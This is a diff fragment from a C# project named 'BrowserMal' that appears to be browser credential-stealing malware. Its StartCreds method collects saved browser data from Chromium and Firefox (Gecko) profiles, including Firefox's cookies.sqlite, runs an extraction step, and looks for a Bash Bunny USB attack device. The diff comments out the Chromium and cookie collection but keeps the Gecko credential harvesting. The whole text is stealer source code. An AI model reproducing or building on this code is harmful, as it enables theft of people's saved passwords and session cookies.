@@ -14,13 +14,13 @@ namespace BrowserMal
 
         public static void StartCreds()
         {
-            browserManager.Init();
-            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
+            /*browserManager.Init();
+            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();*/
 
             geckoBrowserManager.Init();
             List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
 
-            Chromium(ref browsersChromium);
+            //Chromium(ref browsersChromium);
             Gecko(ref browsersGecko);
 
             Extration();
@@ -103,7 +103,7 @@ namespace BrowserMal
             geckoCookies.SetIsSqlite(true);
             geckoCookies.SetFileName("cookies.sqlite");
 
-            list.AddRange(geckoCookies.Init(ref browsers));
+            //list.AddRange(geckoCookies.Init(ref browsers));
         }
 
         private static string GetBashBunny() => RemovableDisks.FindBashBunny();
